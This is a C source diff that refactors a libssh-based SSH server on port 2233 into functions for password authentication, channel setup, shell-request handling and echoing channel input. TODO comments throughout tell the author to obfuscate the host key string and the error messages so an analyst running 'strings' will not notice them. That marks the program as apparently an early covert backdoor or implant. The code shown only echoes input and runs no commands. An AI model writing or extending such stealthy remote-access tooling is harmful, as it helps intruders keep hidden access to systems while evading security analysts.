@@ -17,7 +17,7 @@ static int auth_password(const char *username, const char *password) {
     return result;
 }
 
-static int auth(ssh_message message) {
+static int authMessage(ssh_message message) {
     int response = FAILURE;
 
     if(ssh_message_subtype(message) == SSH_AUTH_METHOD_PASSWORD) {
@@ -35,44 +35,9 @@ static int auth(ssh_message message) {
     return response;
 }
 
-static void setOptions(ssh_bind bind) {
-    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT_STR, "2233");
-    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_HOSTKEY, "host_key"); // TODO: You'll be wanting to obfuscate this string to make it less obvious when an analyst runs `strings` against it
-}
-
-int main(int argc, char **argv) {
-    ssh_session sesh;
-    ssh_bind bind;
-    ssh_message message;
-    ssh_channel chan = 0;
+static int authenticate(ssh_session sesh) {
     int authed = 0;
-    int sftp = 0;
-
-    int error_state = 0;
-
-    bind = ssh_bind_new();
-    sesh = ssh_new();
-
-    setOptions(bind);
-    
-    error_state = ssh_bind_listen(bind);
-
-    if(error_state) {
-        printf("ERROR on listen\n");  // TODO: This will want to be obfuscated/removed too
-        return ERROR;
-    }
-
-    error_state = ssh_bind_accept(bind, sesh);
-
-    if(error_state == SSH_ERROR) {
-        printf("ERROR on accept\n");  // TODO: This will want to be obfuscated/removed too
-        return ERROR;
-    }
-
-    if(ssh_handle_key_exchange(sesh)) {
-        printf("ERROR on KEx\n");  // TODO: This will want to be obfuscated/removed too
-        return ERROR;
-    }
+    ssh_message message;
 
     while(!authed) {
         message = ssh_message_get(sesh);
@@ -83,7 +48,7 @@ int main(int argc, char **argv) {
 
         switch(ssh_message_type(message)) {
             case SSH_REQUEST_AUTH:
-                authed = auth(message);
+                authed = authMessage(message);
                 break;
             default:
                 ssh_message_reply_default(message);
@@ -92,11 +57,12 @@ int main(int argc, char **argv) {
         ssh_message_free(message);
     }
 
-    if(!authed) {
-        printf("ERROR auth\n");
-        ssh_disconnect(sesh);
-        return ERROR;
-    }
+    return authed;
+}
+
+static ssh_channel openChannel(ssh_session sesh) {
+    ssh_message message;
+    ssh_channel chan;
 
     do {
         message = ssh_message_get(sesh);
@@ -114,32 +80,115 @@ int main(int argc, char **argv) {
 
         ssh_message_free(message);
     } while(message && !chan);
+    
+    return chan;
+}
 
-    if(!chan) {
-        printf("ERROR sesh\n");
-        ssh_finalize();
-        return ERROR;
-    }
+static int openShell(ssh_session sesh) {
+    ssh_message message;
+    int shellRequested = 0;
 
     do {
         message = ssh_message_get(sesh);
 
         if(message) {
-            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL) {
-                sftp = SUCCESS;
+            if(ssh_message_type(message) == SSH_REQUEST_CHANNEL && ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_SHELL) {
                 ssh_message_channel_request_reply_success(message);
+                shellRequested = 1;
                 break;
+            } 
+            
+            else {
+                ssh_message_reply_default(message);
             }
-        }
-
-        if(!sftp) {
-            ssh_message_reply_default(message);
-        }
+        }        
 
         ssh_message_free(message);
-    } while(message && !sftp);
+    } while(message && !shellRequested);
+    
+    return shellRequested;
+}
+
+static void setOptions(ssh_bind bind) {
+    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT_STR, "2233");
+    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_HOSTKEY, "host_key"); // TODO: You'll be wanting to obfuscate this string to make it less obvious when an analyst runs `strings` against it
+}
+
+static int readMessages(ssh_channel chan) {
+    char buffer[2048];
+    int i = 0;
+    int result = 0;
+
+    do {
+        i = ssh_channel_read(chan, buffer, 2048, 0);
+
+        if(i > 0) {
+            ssh_channel_write(chan, buffer, i);
+
+            if(write(1, buffer, i) < 0) {
+                printf("ERROR buffer\n");
+                result = ERROR;
+            }
+        }
+    } while(i > 0);
+
+    return result;
+}
+
+int main(int argc, char **argv) {
+    ssh_session sesh;
+    ssh_bind bind;
+    ssh_message message;
+    ssh_channel chan = 0;
+    int shell = 0;
+    int errorState = 0;
+
+    bind = ssh_bind_new();
+    sesh = ssh_new();
+
+    setOptions(bind);
+    
+    errorState = ssh_bind_listen(bind);
+
+    if(errorState) {
+        printf("ERROR on listen\n");  // TODO: This will want to be obfuscated/removed too
+        return ERROR;
+    }
+
+    errorState = ssh_bind_accept(bind, sesh);
+
+    if(errorState == SSH_ERROR) {
+        printf("ERROR on accept\n");  // TODO: This will want to be obfuscated/removed too
+        return ERROR;
+    }
+
+    if(ssh_handle_key_exchange(sesh)) {
+        printf("ERROR on KEx\n");  // TODO: This will want to be obfuscated/removed too
+        return ERROR;
+    }
+
+    if(!authenticate(sesh)) {
+        printf("ERROR auth\n");
+        ssh_disconnect(sesh);
+        return ERROR;
+    }
+
+    chan = openChannel(sesh);
+
+    if(!chan) {
+        printf("ERROR channel\n");
+        ssh_finalize();
+        return ERROR;
+    }
+
+    if(!openShell(sesh)) {
+        printf("WARN No shell requested\n");
+        return ERROR;
+    }
 
     printf("Connected\n");
+
+    errorState = readMessages(chan);
 
     ssh_disconnect(sesh);
     ssh_bind_free(bind);
